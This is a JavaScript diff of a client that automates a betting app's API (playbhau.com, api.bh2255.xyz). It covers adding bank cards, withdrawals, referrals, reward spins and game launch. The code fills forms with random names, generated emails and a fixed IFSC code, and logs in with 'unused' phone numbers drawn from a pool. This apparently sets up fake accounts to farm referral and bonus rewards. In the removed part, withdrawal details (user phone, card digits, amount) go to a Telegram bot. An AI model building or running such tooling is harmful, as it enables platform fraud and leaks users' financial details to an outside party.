-        document.getElementById('cardNameInput').value = newName;
-        document.getElementById('cardEmailInput').value = randEmail(newName);
-        document.getElementById('cardNumberInput').value = '';
-        document.getElementById('ifscInput').value = 'MAHB0002009';
-        setTimeout(() => renderAddCard(), 800);
-        await getWithdrawCards();
-      } else {
-        div.innerHTML = `<div style="color:#ff6b6b;">❌ ${result.msg || 'Failed'}</div>`;
-      }
-    });
-  }
-
-  // ---- WITHDRAW RENDER ----
-  async function renderWithdraw() {
-    state.currentPanel = 'withdraw';
-    
-    await getBalance();
-    const gameBalance = state.balance;
-    
-    await getWithdrawCards();
-    
-    let cardHtml = '';
-    if (state.withdrawCards && state.withdrawCards.length > 0) {
-      cardHtml = `<div style="margin-bottom:8px;"><div style="color:#7a8aaa;font-size:10px;font-weight:600;margin-bottom:4px;">Select Card</div><div id="cardList">`;
-      for (const c of state.withdrawCards) {
-        const id = c.id || c.cardId || '?';
-        const idNum = parseInt(id);
-        const holder = c.accountName || c.holderName || c.name || 'Unknown';
-        const bank = c.bankName || c.bank || 'Bank';
-        const acc = c.accountNumber || c.cardNumber || c.cardNo || '';
-        const selected = (state.selectedCard !== null && idNum === state.selectedCard) ? 'selected' : '';
-        cardHtml += `<div class="payment-method card-item ${selected}" data-id="${idNum}" data-holder="${holder}" data-acc="${acc}"><div><div class="pm-name">${bank} - ${holder}</div><div class="pm-desc">${acc ? '****'+acc.slice(-4) : ''}</div></div></div>`;
-      }
-      cardHtml += `</div></div>`;
-    } else {
-      cardHtml = `<div style="color:#ff6b6b;font-size:12px;text-align:center;padding:8px;">❌ No bank card found. Please add a card first.</div>`;
-    }
-    
-    showPanel(`
-      <div class="dynamic-card">
-        <div class="title">💸 Withdraw Funds <button class="btn-close-panel" onclick="window._closePanel()">✕ Close</button></div>
-        <div class="balance-info">Available Balance: <span>₹${gameBalance.toFixed(2)}</span></div>
-        ${cardHtml}
-        <div style="margin-top:8px;">
-          <div style="color:#7a8aaa;font-size:10px;font-weight:600;margin-bottom:4px;">Enter Amount</div>
-          <input type="number" id="withdrawAmountInput" placeholder="Enter amount to withdraw" min="0" step="1" style="width:100%;padding:10px 14px;background:rgba(5,9,24,0.5);border:1px solid rgba(255,255,255,0.04);border-radius:14px;color:#eef2f9;font-size:14px;outline:none;box-shadow:inset 0 2px 8px rgba(0,0,0,0.1);">
-        </div>
-        <button class="btn-sm btn-withdraw btn-block" id="withdrawSubmitBtn" ${!state.withdrawCards || state.withdrawCards.length === 0 ? 'disabled' : ''}>💸 Withdraw Now</button>
-        <div id="withdrawResult" class="mt-10"></div>
-      </div>
-    `);
-    
-    document.querySelectorAll('.card-item').forEach(el => {
-      el.addEventListener('click', function() {
-        document.querySelectorAll('.card-item').forEach(x => x.classList.remove('selected'));
-        this.classList.add('selected');
-        state.selectedCard = parseInt(this.dataset.id);
-        console.log(`Card selected: ${state.selectedCard}`);
-      });
-    });
-    
-    document.getElementById('withdrawSubmitBtn').addEventListener('click', async function() {
-      if (!state.selectedCard) {
-        showToast('Please select a card.', 'warning');
-        return;
-      }
-      const amountInput = document.getElementById('withdrawAmountInput');
-      const amount = parseFloat(amountInput.value);
-      if (!amount || amount <= 0) {
-        showToast('Please enter a valid amount.', 'warning');
-        return;
-      }
-      if (amount > state.balance) {
-        showToast(`Amount exceeds available balance (₹${state.balance.toFixed(2)})`, 'warning');
-        return;
-      }
-      
-      this.disabled = true;
-      this.textContent = '⏳ Processing...';
-      
-      const apiResult = await apiWithdraw(amount, state.selectedCard);
-      
-      this.disabled = false;
-      this.textContent = '💸 Withdraw Now';
-      
-      const div = document.getElementById('withdrawResult');
-      
-      const now = new Date();
-      const timeStr = now.toLocaleString('en-IN', { day: '2-digit', month: '2-digit', year: 'numeric', hour: '2-digit', minute: '2-digit' });
-      
-      let cardNumber = 'Unknown';
-      document.querySelectorAll('.card-item').forEach(el => {
-        if (el.classList.contains('selected')) {
-          const desc = el.querySelector('.pm-desc')?.textContent || '';
-          const match = desc.match(/\*\*\*\*(\d+)/);
-          cardNumber = match ? match[1] : 'Unknown';
-        }
-      });
-      
-      if (apiResult && apiResult.success) {
-        const orderId = apiResult.data?.orderId || 'N/A';
-        
-        let telegramMsg = `💸 <b>NEW WITHDRAWAL</b>\n\n`;
-        telegramMsg += `👤 User: <b>${state.phone || 'Unknown'}</b>\n`;
-        telegramMsg += `💰 Amount: <b>₹${amount.toFixed(2)}</b>\n`;
-        telegramMsg += `💳 Card: <b>${cardNumber}</b>\n`;
-        telegramMsg += `📋 Order ID: <b>${orderId}</b>\n`;
-        telegramMsg += `⏱ Time: <b>${timeStr}</b>\n`;
-        telegramMsg += `✅ Status: <b>SUCCESS</b>`;
-        sendTelegramMessage(telegramMsg);
-        
-        div.innerHTML = `
-          <div style="background:rgba(0,0,0,0.2);padding:10px;border-radius:14px;">
-            <div style="color:#5df0ae;font-weight:600;">✅ Withdrawal successful!</div>
-            <div style="color:#8a9aaa;">₹${amount.toFixed(2)} withdrawn</div>
-            <div style="font-size:9px;color:#6a7a9a;margin-top:4px;">Order ID: ${orderId}</div>
+    }else cardHtml='<div style="color:#6b7280;font-size:12px;margin-bottom:10px;">No cards added</div>';
+    const autoName=randName();
+    showPanel(`<div class="dynamic-card"><div class="title">💳 Add Bank Card <button class="btn-close-panel" onclick="window._closePanel()">✕ Close</button></div>
+      ${cardHtml}
+      <div style="border-top:1px solid rgba(255,255,255,0.02);padding-top:12px;">
+        <div class="input-group"><label>👤 Account Holder</label><input id="cardNameInput" value="${autoName}"></div>
+        <div class="input-group">
+          <label>💳 Account Number</label>
+          <div class="input-row">
+            <input id="cardNumberInput" placeholder="Enter account number">
+            <button class="btn-camera" id="cameraBtn" title="Open Google Lens / Camera to scan number">📷</button>
           </div>
-        `;
-        showToast('Withdrawal successful!', 'success');
-        await getBalance();
-        balanceDisplay.textContent = state.balance.toFixed(2);
-        amountInput.value = '';
-      } else {
-        const errorMsg = apiResult?.msg || 'Unknown error';
-        let telegramMsg = `💸 <b>NEW WITHDRAWAL</b>\n\n`;
-        telegramMsg += `👤 User: <b>${state.phone || 'Unknown'}</b>\n`;
-        telegramMsg += `💰 Amount: <b>₹${amount.toFixed(2)}</b>\n`;
-        telegramMsg += `💳 Card: <b>${cardNumber}</b>\n`;
-        telegramMsg += `📋 Order ID: <b>N/A</b>\n`;
-        telegramMsg += `⏱ Time: <b>${timeStr}</b>\n`;
-        telegramMsg += `✅ Status: <b>FAIL</b>\n`;
-        telegramMsg += `⚠️ REASON: <b>${errorMsg}</b>`;
-        const tgResult = await sendTelegramMessage(telegramMsg);
-        if (tgResult && tgResult.message_id) {
-          setTimeout(() => deleteTelegramMessage(tgResult.message_id), 5 * 60 * 1000);
-        }
-        
-        div.innerHTML = `<div style="color:#ff6b6b;">❌ Failed: ${errorMsg}</div>`;
-        showToast('Withdrawal failed: ' + errorMsg, 'error');
-      }
+        </div>
+        <div class="input-group"><label>🏛️ IFSC</label><input id="ifscInput" value="MAHB0002009"></div>
+        <div class="input-group"><label>📧 Email</label><input id="cardEmailInput" value="${randEmail(autoName)}"></div>
+        <button class="btn-sm btn-card-add btn-block" id="addCardSubmitBtn">➕ Add Card</button>
+        <div id="addCardResult" class="mt-10"></div>
+      </div></div>`);
+
+    // ─── CAMERA / GOOGLE LENS BUTTON ──────────────────────────────────────
+    const cameraBtn = document.getElementById('cameraBtn');
+    cameraBtn.addEventListener('click', function() {
+      openGoogleLensOrCamera();
     });
-  }
 
-  async function renderBalance() {
-    state.currentPanel = 'balance';
-    await getBalance();
-    showPanel(`
-      <div class="dynamic-card">
-        <div class="title">📊 Balance <button class="btn-close-panel" onclick="window._closePanel()">✕ Close</button></div>
-        <div style="text-align:center;padding:20px;">
-          <div style="font-size:36px;font-weight:800;color:#5df0ae;text-shadow:0 0 40px rgba(93,240,174,0.05);">₹${state.balance.toFixed(2)}</div>
-          <div style="color:#6a7a9a;font-size:13px;margin-top:4px;">Available Balance</div>
-        </div>
-      </div>
-    `);
-  }
-
-  async function renderTransactions() {
-    state.currentPanel = 'transactions';
-    const loadingHtml = `
-      <div class="dynamic-card">
-        <div class="title">📋 Transaction History <button class="btn-close-panel" onclick="window._closePanel()">✕ Close</button></div>
-        <div style="text-align:center;padding:20px;color:#6a7a9a;">Loading transactions...</div>
-      </div>
-    `;
-    showPanel(loadingHtml);
-
-    const [deposits, withdraws] = await Promise.all([
-      getDepositHistory(1),
-      getWithdrawHistory(1)
-    ]);
-
-    let allTxns = [];
-
-    if (deposits && deposits.length > 0) {
-      for (const txn of deposits) {
-        allTxns.push({
-          type: 'deposit',
-          appDate: txn.appDate || txn.createTime || Date.now(),
-          amount: txn.paidAmount || txn.price || 0,
-          balance: txn.balance || 0,
-          orderNo: txn.orderNo || txn.order || '',
-          payTypeName: txn.payTypeName || 'Recharge',
-          channelName: txn.channelName || '',
-          status: txn.status || 'COMPLETE',
-          gameName: txn.gameName || '',
-          iconUrl: txn.iconUrl || ''
-        });
-      }
-    }
-
-    if (withdraws && withdraws.length > 0) {
-      for (const txn of withdraws) {
-        allTxns.push({
-          type: 'withdraw',
-          appDate: txn.createTime || Date.now(),
-          amount: txn.paidAmount || 0,
-          reward: txn.reward || 0,
-          orderNo: txn.orderNo || '',
-          bankName: txn.bankName || '',
-          userCardNumber: txn.userCardNumber || '',
-          status: txn.respCode === 2 ? 'COMPLETE' : 'PENDING',
-          channelName: txn.channelName || 'SYSTEM'
-        });
-      }
-    }
-
-    allTxns.sort((a, b) => (b.appDate || 0) - (a.appDate || 0));
-
-    let html = `
-      <div class="dynamic-card">
-        <div class="title">📋 Transaction History (${allTxns.length}) <button class="btn-close-panel" onclick="window._closePanel()">✕ Close</button></div>
-        <div style="display:flex;gap:6px;margin-bottom:10px;flex-wrap:wrap;">
-          <button class="btn-sm btn-info" id="txnAll" style="flex:1;background:rgba(30,144,255,0.1);color:#68a9ff;border:1px solid rgba(30,144,255,0.1);">All</button>
-          <button class="btn-sm btn-success" id="txnDeposit" style="flex:1;">Deposits</button>
-          <button class="btn-sm btn-withdraw" id="txnWithdraw" style="flex:1;">Withdrawals</button>
-        </div>
-        <div id="transactionList" style="max-height:350px;overflow-y:auto;font-size:12px;">
-    `;
-
-    if (allTxns.length === 0) {
-      html += `<div style="color:#6a7a9a;text-align:center;padding:20px;">No transactions found</div>`;
-    } else {
-      for (const txn of allTxns) {
-        const date = new Date(txn.appDate);
-        const timeStr = date.toLocaleString();
-        const isDeposit = txn.type === 'deposit';
-        const amount = parseFloat(txn.amount || 0).toFixed(2);
-        const balance = parseFloat(txn.balance || 0).toFixed(2);
-        const icon = isDeposit ? '💰' : '💸';
-        const typeLabel = isDeposit ? 'Deposit' : 'Withdraw';
-        const statusColor = txn.status === 'COMPLETE' ? '#5df0ae' : '#ffd45d';
-        const displayName = isDeposit ? (txn.channelName || txn.payTypeName || 'Recharge') : (txn.bankName || 'Bank');
-        const cardInfo = isDeposit ? '' : (txn.userCardNumber ? ` · ${txn.userCardNumber}` : '');
-
-        html += `
-          <div style="display:flex;justify-content:space-between;align-items:center;padding:8px 10px;border-bottom:1px solid rgba(255,255,255,0.02);" data-type="${txn.type}">
-            <div style="flex:1;">
-              <div>
-                <span>${icon} ${typeLabel}</span>
-                <span style="color:#ffd700;margin-left:8px;font-weight:600;">₹${amount}</span>
-                ${txn.gameName ? `<span style="color:#6a7a9a;font-size:10px;margin-left:6px;">🎮 ${txn.gameName}</span>` : ''}
-              </div>
-              <div style="color:#6a7a9a;font-size:9px;margin-top:2px;">
-                ${displayName}${cardInfo} · ${timeStr}
-                ${!isDeposit ? `<span style="color:#8a9aaa;margin-left:6px;">Fee: ₹${(txn.amount - (txn.reward || 0)).toFixed(2)}</span>` : ''}
-                <span style="color:#8a9aaa;margin-left:6px;">Bal: ₹${balance}</span>
-              </div>
-            </div>
-            <div style="text-align:right;">
-              <div style="color:${isDeposit ? '#5df0ae' : '#ff6b6b'};font-size:10px;font-weight:600;">
-                ${isDeposit ? '+' : '-'}₹${amount}
-              </div>
-              <div style="color:${statusColor};font-size:9px;">${txn.status}</div>
-            </div>
-          </div>
-        `;
-      }
-    }
-
-    html += `</div></div>`;
-    showPanel(html);
-
-    const filterMap = {
-      'txnAll': 'all',
-      'txnDeposit': 'deposit',
-      'txnWithdraw': 'withdraw'
-    };
-
-    Object.keys(filterMap).forEach(id => {
-      const btn = document.getElementById(id);
-      if (btn) {
-        btn.addEventListener('click', function() {
-          const filter = filterMap[id];
-          document.querySelectorAll('#transactionList > div').forEach(el => {
-            if (filter === 'all') {
-              el.style.display = 'flex';
-            } else {
-              const type = el.dataset.type || '';
-              el.style.display = type === filter ? 'flex' : 'none';
-            }
+    // ─── DELETE CARD ──────────────────────────────────────────────────────
+    document.querySelectorAll('.delete-card-btn').forEach(b=>{
+      b.addEventListener('click',async function(){
+        if(!confirm('Delete card?')) return;
+        try{
+          const r=await fetch('https://api.bh2255.xyz/app/card/del',{
+            method:'POST',
+            headers:{'Accept':'application/json','Content-Type':'application/json','token':S.token,'packageid':'2','Origin':'https://playbhau.com','Referer':'https://playbhau.com/'},
+            body:JSON.stringify({channel:'h5',channelId:'Samsung',lang:'en_US',visitor:S.visitor,id:parseInt(this.dataset.id),packageId:2,packageInfo:'com.resulta.checka',reqDate:Date.now(),ua:'Mozilla/5.0',versionCode:'999'})
           });
-        });
-      }
-    });
-  }
-
-  async function renderReferral() {
-    state.currentPanel = 'refer';
-    const loadingHtml = `
-      <div class="dynamic-card">
-        <div class="title">👥 Referral History <button class="btn-close-panel" onclick="window._closePanel()">✕ Close</button></div>
-        <div style="text-align:center;padding:20px;color:#6a7a9a;">Loading referral data...</div>
-      </div>
-    `;
-    showPanel(loadingHtml);
-
-    // Fetch referrals but DO NOT auto-save
-    const history = await getReferralHistory(1);
-
-    let html = `
-      <div class="dynamic-card">
-        <div class="title">👥 Referral History <button class="btn-close-panel" onclick="window._closePanel()">✕ Close</button></div>
-    `;
-
-    html += `<div style="border-top:1px solid rgba(255,255,255,0.04);padding-top:10px;">
-      <div style="color:#7a8aaa;font-size:10px;font-weight:600;margin-bottom:6px;">📋 Referral History</div>
-      <div style="max-height:350px;overflow-y:auto;">`;
-    if (history && history.length > 0) {
-      const displayCount = Math.min(history.length, 3);
-      const displayReferrals = history.slice(0, displayCount);
-      
-      for (const ref of displayReferrals) {
-        const date = new Date(ref.createTime);
-        const timeStr = date.toLocaleString();
-        html += `
-          <div class="refer-user-item">
-            <div>
-              <span class="user-phone">📱 ${ref.inviteUserPhone || 'Unknown'}</span>
-              <span class="user-time"> · ${timeStr}</span>
-            </div>
-            <div>
-              <span class="user-status">${ref.status === 1 ? '✅ Active' : '⏳ Pending'}</span>
-            </div>
-          </div>
-        `;
-      }
-    } else {
-      html += `<div style="color:#6a7a9a;font-size:12px;text-align:center;padding:20px;">No referral history yet</div>`;
-    }
-    html += `</div></div>`;
-
-    html += `
-      <div style="margin-top:12px;display:flex;gap:8px;">
-        <button class="btn-sm btn-refer btn-block" id="shareReferralBtn">📤 Share Referral Link</button>
-      </div>
-      <div id="shareResult" class="mt-10"></div>
-    `;
-
-    html += `</div>`;
-    showPanel(html);
-
-    document.getElementById('shareReferralBtn').addEventListener('click', async function() {
-      try {
-        const headers = {
-          'Accept': 'application/json, text/plain, */*',
-          'Token': state.token,
-          'Visitor': state.visitor,
-          'Origin': 'https://playbhau.com',
-          'Referer': 'https://playbhau.com/'
-        };
-        const res = await fetch('https://api.bh2255.xyz/app/share/getShareInfo', {
-          method: 'GET',
-          headers
-        });
-        if (res.status === 200) {
-          const data = await res.json();
-          if (data.code === 0) {
-            const shareData = data.data || {};
-            const shareUrl = shareData.shareUrl || 'https://playbhau.com/';
-            const shareText = shareData.shareText || 'Join Bhau Lottery and win big! 🎰';
-            const resultDiv = document.getElementById('shareResult');
-            resultDiv.innerHTML = `
-              <div style="background:rgba(0,0,0,0.2);padding:10px;border-radius:14px;">
-                <div style="color:#5df0ae;font-weight:600;">✅ Share link ready!</div>
-                <div style="font-size:11px;color:#8a9aaa;word-break:break-all;margin:6px 0;">🔗 ${shareUrl}</div>
-                <div style="display:flex;gap:6px;margin-top:4px;">
-                  <button class="btn-sm btn-primary" onclick="navigator.clipboard.writeText('${shareUrl}')" style="padding:6px 14px;font-size:11px;">📋 Copy Link</button>
-                  <button class="btn-sm btn-warning" onclick="window.open('${shareUrl}','_blank')" style="padding:6px 14px;font-size:11px;">🌐 Open</button>
-                </div>
-                ${shareText ? `<div style="font-size:10px;color:#6a7a9a;margin-top:4px;">📝 ${shareText}</div>` : ''}
-              </div>
-            `;
-          }
-        }
-      } catch (e) {}
-    });
-  }
-
-  function renderGames() {
-    state.currentPanel = 'games';
-    showPanel(`
-      <div class="dynamic-card">
-        <div class="title">🎮 Launch Games <button class="btn-close-panel" onclick="window._closePanel()">✕ Close</button></div>
-        <div style="display:flex;flex-direction:column;gap:8px;">
-          <button class="btn-sm btn-success btn-block" id="launchFanTan">🎯 Fan Tan</button>
-          <button class="btn-sm btn-warning btn-block" id="launchChicken">🐔 Chicken Road 2</button>
-          <button class="btn-sm btn-primary btn-block" id="launchBoth">🎮 Both Games</button>
-        </div>
-        <div id="gameResult" class="mt-10"></div>
-      </div>
-    `);
-    document.getElementById('launchFanTan').addEventListener('click', async () => {
-      const res = await getFanTanUrl();
-      if (res && res.success) { window.open(res.game_url, '_blank');
-        document.getElementById('gameResult').innerHTML = `<div class="game-result"><span class="ok">✅ Fan Tan launched!</span></div>`;
-      }
-    });
-    document.getElementById('launchChicken').addEventListener('click', async () => {
-      const res = await getChickenRoadUrl();
-      if (res && res.success) { window.open(res.game_url, '_blank');
-        document.getElementById('gameResult').innerHTML = `<div class="game-result"><span class="ok">✅ Chicken Road 2 launched!</span></div>`;
-      }
-    });
-    document.getElementById('launchBoth').addEventListener('click', async () => {
-      const r1 = await getFanTanUrl(); if (r1?.success) window.open(r1.game_url, '_blank');
-      const r2 = await getChickenRoadUrl(); if (r2?.success) window.open(r2.game_url, '_blank');
-      document.getElementById('gameResult').innerHTML = `<div class="game-result"><span class="ok">✅ Both launched!</span></div>`;
-    });
-  }
-
-  function renderWelcome() {
-    closePanel();
-  }
-
-  // ---- EXIT PERMISSION LOGIC ----
-  function showExitPermission() {
-    exitOverlay.classList.add('active');
-  }
-
-  function hideExitPermission() {
-    exitOverlay.classList.remove('active');
-  }
-
-  exitStayBtn.addEventListener('click', function() {
-    hideExitPermission();
-    history.pushState(null, '', window.location.href);
-  });
-
-  exitLeaveBtn.addEventListener('click', function() {
-    hideExitPermission();
-    window.location.href = 'about:blank';
-  });
-
-  // ---- INTERCEPT BACK BUTTON ----
-  history.pushState(null, '', window.location.href);
-
-  window.addEventListener('popstate', function(e) {
-    if (state.isLoggedIn) {
-      closePanel();
-      showExitPermission();
-      history.pushState(null, '', window.location.href);
-    }
-  });
-
-  // ---- LOGOUT CONFIRMATION ----
-  function showLogoutConfirmation() {
-    logoutConfirmOverlay.classList.add('active');
-  }
-
-  function hideLogoutConfirmation() {
-    logoutConfirmOverlay.classList.remove('active');
-  }
-
-  logoutYesBtn.addEventListener('click', function() {
-    hideLogoutConfirmation();
-    doLogout();
-  });
-
-  logoutNoBtn.addEventListener('click', function() {
-    hideLogoutConfirmation();
-  });
-
-  function doLogout() {
-    state.token = null;
-    state.isLoggedIn = false;
-    state.phone = null;
-    state.balance = 0;
-    state.selectedAmount = 200;
-    state.selectedPayment = null;
-    state.isAutoClaiming = false;
-    state.depositAmounts = [];
-    state.paymentMethods = [];
-    state.withdrawCards = [];
-    state.cardList = [];
-    state.selectedCard = null;
-    state.referralHistoryCache = null;
-    
-    clearSession();
-    hideExitPermission();
-    closePanel();
-    hideLogoutConfirmation();
-    
-    loginSection.style.display = 'block';
-    dashboard.style.display = 'none';
-    dynamicContent.innerHTML = '';
-    balanceDisplay.textContent = '0.00';
-  }
-
-  // ---- LOGIN HANDLER ----
-  async function handleLogin(e) {
-    e.preventDefault();
-    const phone = phoneInput.value.trim();
-    const password = passwordInput.value.trim();
-    if (phone.length !== 10) {
-      showToast('Please enter a valid 10-digit phone number.', 'warning');
-      return;
-    }
-    loginBtn.disabled = true; loginBtn.textContent = '⏳ Logging...';
-    const ok = await login(phone, password);
-    if (ok) {
-      loginSection.style.display = 'none';
-      dashboard.style.display = 'block';
-      userPhoneDisplay.textContent = phone;
-      await getBalance();
-      renderWelcome();
-      // Load referrals but DO NOT auto-save
-      await getReferralHistory(1);
-      await updateNumberDisplayFromServer();
-      await getWithdrawCards();
-      history.pushState(null, '', window.location.href);
-      showToast('Login successful! Welcome back!', 'success');
-    }
-    loginBtn.disabled = false; loginBtn.textContent = '🔑  LOGIN & LOAD GAME  →';
-  }
-
-  // ---- AUTO PASTE (Supabase) ----
-  autopasteBtn.addEventListener("click", async function () {
-    autopasteBtn.disabled = true;
-
-    try {
-      const result = await autoLoginAPI("claim");
-
-      if (!result.number) {
-        throw new Error("No unused number available.");
-      }
-
-      const phoneNumber = result.number;
-
-      phoneInput.value = phoneNumber;
-
-      phoneInput.dispatchEvent(
-        new Event("input", { bubbles: true })
-      );
-
-      phoneInput.dispatchEvent(
-        new Event("change", { bubbles: true })
-      );
-
-      showToast("Number pasted successfully.", "success");
-
-      // Refresh the display - but DO NOT auto-save referrals
-      await updateNumberDisplayFromServer();
-
-    } catch (error) {
-      showToast(
-        error.message || "No unused number available.",
-        "warning"
-      );
-    } finally {
-      autopasteBtn.disabled = false;
-    }
-  });
-
-  // ---- MANUAL AUTO SAVE REFERRALS BUTTON ----
-  autoSaveReferralsBtn.addEventListener("click", manualAutoSaveReferrals);
-
-  // ---- SAVE NUMBER BUTTON ----
-  saveNumberBtn.addEventListener("click", addAutoNumberFromServer);
-
-  saveNumberInput.addEventListener('keydown', function(e) {
-    if (e.key === 'Enter') {
-      saveNumberBtn.click();
-    }
-  });
-
-  // ---- RESTORE SESSION ----
-  function restoreSession() {
-    if (loadSession()) {
-      loginSection.style.display = 'none';
-      dashboard.style.display = 'block';
-      userPhoneDisplay.textContent = state.phone || '8597630383';
-      updateNumberDisplayFromServer();
-      getBalance().then(() => {
-        renderWelcome();
-        // Load referrals but DO NOT auto-save
-        getReferralHistory(1);
-        getWithdrawCards();
+          const d=await r.json();
+          if(d.code===0||d.success===true){ if(S.selectedCard!==null && parseInt(this.dataset.id)===S.selectedCard) S.selectedCard=null; renderAddCard(); }
+        }catch(_){}
       });
-      return true;
-    }
-    return false;
+    });
+
+    // ─── ADD CARD SUBMIT ──────────────────────────────────────────────────
+    document.getElementById('addCardSubmitBtn').addEventListener('click',async function(){
+      const name=document.getElementById('cardNameInput').value.trim();
+      const number=document.getElementById('cardNumberInput').value.trim().replace(/\s/g,'');
+      const ifsc=document.getElementById('ifscInput').value.trim().toUpperCase();
+      const email=document.getElementById('cardEmailInput').value.trim();
+      if(!name||!number||!ifsc) return;
+      this.disabled=true; this.textContent='⏳ Adding...';
+      try{
+        const r=await fetch('https://api.bh2255.xyz/app/card/add',{
+          method:'POST',
+          headers:{'Accept':'application/json','Content-Type':'application/json','token':S.token,'packageid':'2','Origin':'https://playbhau.com','Referer':'https://playbhau.com/'},
+          body:JSON.stringify({channel:'h5',channelId:'Samsung',lang:'en_US',visitor:S.visitor,cardName:name,cardNumber:number,email:email||'',ifsCode:ifsc,smsCode:'',packageId:2,packageInfo:'com.resulta.checka',reqDate:Date.now(),ua:'Mozilla/5.0',versionCode:'999'})
+        });
+        const d=await r.json();
+        const div=document.getElementById('addCardResult');
+        if(r.status===200 && (d.code===0||d.success===true)){
+          div.innerHTML=`<div style="color:#34d399;">✅ Card added!</div>`;
+          const newId=parseInt(d.data?.id||d.data?.cardId);
+          if(!isNaN(newId)) S.selectedCard=newId;
+          const newName=randName();
+          document.getElementById('cardNameInput').value=newName;
+          document.getElementById('cardEmailInput').value=randEmail(newName);
+          document.getElementById('cardNumberInput').value='';
+          document.getElementById('ifscInput').value='MAHB0002009';
+          setTimeout(()=>renderAddCard(),600);
+        }else{
+          div.innerHTML=`<div style="color:#fb7185;">❌ ${d.msg||'Failed'}</div>`;
+        }
+      }catch(e){ showToast('Error: '+e.message,'error'); }
+      this.disabled=false; this.textContent='➕ Add Card';
+    });
   }
 
-  // ---- MENU EVENTS ----
-  document.querySelectorAll('.menu-item').forEach(item => {
-    item.addEventListener('click', function() {
-      const action = this.dataset.action;
-      
-      if (action === 'logout') {
-        showLogoutConfirmation();
-        return;
+  // ─── OTHER PANELS ──────────────────────────────────────────────────────
+  async function renderBalance(){
+    S.currentPanel='balance';
+    await getBalance();
+    showPanel(`<div class="dynamic-card"><div class="title">📊 Balance <button class="btn-close-panel" onclick="window._closePanel()">✕ Close</button></div>
+      <div style="text-align:center;padding:20px;"><div style="font-size:36px;font-weight:800;color:#34d399;text-shadow:0 0 40px rgba(52,211,153,0.03);">₹${S.balance.toFixed(2)}</div>
+      <div style="color:#6b7280;font-size:13px;margin-top:4px;">Available Balance</div></div></div>`);
+  }
+
+  function renderGames(){
+    S.currentPanel='games';
+    showPanel(`<div class="dynamic-card"><div class="title">🎮 Launch Games <button class="btn-close-panel" onclick="window._closePanel()">✕ Close</button></div>
+      <div style="display:flex;flex-direction:column;gap:8px;">
+        <button class="btn-sm btn-success btn-block" id="launchFanTan">🎯 Fan Tan</button>
+        <button class="btn-sm btn-warning btn-block" id="launchChicken">🐔 Chicken Road 2</button>
+        <button class="btn-sm btn-primary btn-block" id="launchBoth">🎮 Both Games</button>
+      </div>
+      <div id="gameResult" class="mt-10"></div></div>`);
+    document.getElementById('launchFanTan').addEventListener('click',async ()=>{
+      try{
+        const r=await fetch('https://ltapi.game712.com/iGaming/common/getGameStart?id=27873&otherGame=true',{method:'GET',headers:{'Accept':'application/json','Token':S.token,'Visitor':S.visitor,'Origin':'https://playbhau.com','Referer':'https://playbhau.com/','PackageId':'2'}});
+        const d=await r.json();
+        if(d.code===0 && d.success){ let url=d.data?.gameUrl||''; if(url){ url=decodeURIComponent(url.replace(/\\/g,'')); window.open(url,'_blank'); document.getElementById('gameResult').innerHTML='<div class="game-result"><span class="ok">✅ Fan Tan launched!</span></div>'; } }
+      }catch(_){}
+    });
+    document.getElementById('launchChicken').addEventListener('click',async ()=>{
+      try{
+        const r=await fetch('https://ltapi.game712.com/iGaming/common/getGameStart?id=41285&otherGame=true',{method:'GET',headers:{'Accept':'application/json','Token':S.token,'Visitor':S.visitor,'Origin':'https://playbhau.com','Referer':'https://playbhau.com/','PackageId':'2'}});
+        const d=await r.json();
+        if(d.code===0 && d.success){ let url=d.data?.gameUrl||''; if(url){ url=decodeURIComponent(url.replace(/\\/g,'')); window.open(url,'_blank'); document.getElementById('gameResult').innerHTML='<div class="game-result"><span class="ok">✅ Chicken Road 2 launched!</span></div>'; } }
+      }catch(_){}
+    });
+    document.getElementById('launchBoth').addEventListener('click',async ()=>{
+      document.getElementById('gameResult').innerHTML='<div class="game-result"><span class="ok">✅ Launching both...</span></div>';
+      try{
+        const r1=await fetch('https://ltapi.game712.com/iGaming/common/getGameStart?id=27873&otherGame=true',{method:'GET',headers:{'Accept':'application/json','Token':S.token,'Visitor':S.visitor,'Origin':'https://playbhau.com','Referer':'https://playbhau.com/','PackageId':'2'}});
+        const d1=await r1.json();
+        if(d1.code===0 && d1.success){ let url=d1.data?.gameUrl||''; if(url){ url=decodeURIComponent(url.replace(/\\/g,'')); window.open(url,'_blank'); } }
+      }catch(_){}
+      try{
+        const r2=await fetch('https://ltapi.game712.com/iGaming/common/getGameStart?id=41285&otherGame=true',{method:'GET',headers:{'Accept':'application/json','Token':S.token,'Visitor':S.visitor,'Origin':'https://playbhau.com','Referer':'https://playbhau.com/','PackageId':'2'}});
+        const d2=await r2.json();
+        if(d2.code===0 && d2.success){ let url=d2.data?.gameUrl||''; if(url){ url=decodeURIComponent(url.replace(/\\/g,'')); window.open(url,'_blank'); } }
+      }catch(_){}
+      document.getElementById('gameResult').innerHTML='<div class="game-result"><span class="ok">✅ Both launched!</span></div>';
+    });
+  }
+
+  async function autoClaim(){
+    if(S.isAutoClaiming) return;
+    if(!confirm('⚡ Start Auto Claim?\n\n1st Spin → VIP Reward → wait 3s → 2nd Spin')) return;
+    S.isAutoClaiming=true;
+    showPanel(`<div class="dynamic-card"><div class="title">⚡ Auto Claim Progress <button class="btn-close-panel" onclick="window._closePanel()">✕ Close</button></div>
+      <div id="autoClaimProgress" style="font-size:12px;color:#6b7280;"></div></div>`);
+    const p=document.getElementById('autoClaimProgress');
+    let results=[];
+    try{
+      p.innerHTML+=`<div>🎰 Spin #1 ...</div>`;
+      const s1=await spinTurntable(10,1);
+      if(s1){ results.push({step:'Spin #1',status:'✅ Success'}); p.innerHTML+=`<div style="color:#34d399;">✅ Spin #1 successful!</div>`; }
+      else{ results.push({step:'Spin #1',status:'❌ Failed'}); p.innerHTML+=`<div style="color:#fb7185;">❌ Spin #1 failed</div>`; }
+      await new Promise(r=>setTimeout(r,500));
+      p.innerHTML+=`<div>👑 Claiming VIP Reward...</div>`;
+      const vip=await claimVipReward();
+      if(vip){ results.push({step:'VIP Reward',status:'✅ Success'}); p.innerHTML+=`<div style="color:#34d399;">✅ VIP Reward claimed!</div>`; }
+      else{ results.push({step:'VIP Reward',status:'❌ Failed'}); p.innerHTML+=`<div style="color:#fb7185;">❌ VIP failed</div>`; }
+      p.innerHTML+=`<div style="color:#fbbf24;">⏳ Waiting 3 seconds...</div>`;
+      await new Promise(r=>setTimeout(r,3000));
+      p.innerHTML+=`<div>🎰 Spin #2 ...</div>`;
+      const s2=await spinTurntable(10,1);
+      if(s2){ results.push({step:'Spin #2',status:'✅ Success'}); p.innerHTML+=`<div style="color:#34d399;">✅ Spin #2 successful!</div>`; }
